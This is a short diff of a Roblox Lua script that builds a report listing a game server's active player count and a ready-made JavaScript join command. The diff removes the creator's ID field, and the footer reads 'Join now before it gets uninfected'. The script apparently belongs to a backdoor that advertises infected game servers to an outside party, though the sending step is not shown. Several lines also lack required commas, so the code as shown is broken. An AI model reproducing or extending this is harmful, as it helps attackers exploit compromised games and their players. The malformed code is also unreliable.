@@ -58,11 +58,6 @@ local data = {
 					inline = false
 				},
 				{
-					name = "Creator ID"
-					value = info.Creator.UserId,
-					inline = false
-				},
-				{
 					name = "Active Player",
 					value = tostring(#game.Players:GetPlayers()).. "Active Playerss",
 					inline = false
@@ -71,7 +66,7 @@ local data = {
 					name = "Join Code (JS)"
 					value = "```js\nRoblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ', "' .. game.JobId .. "\")\n```"
 					inline = false
-				},
+				}
 			},
 			footer = {
 				text = "Join now before it gets uninfected"
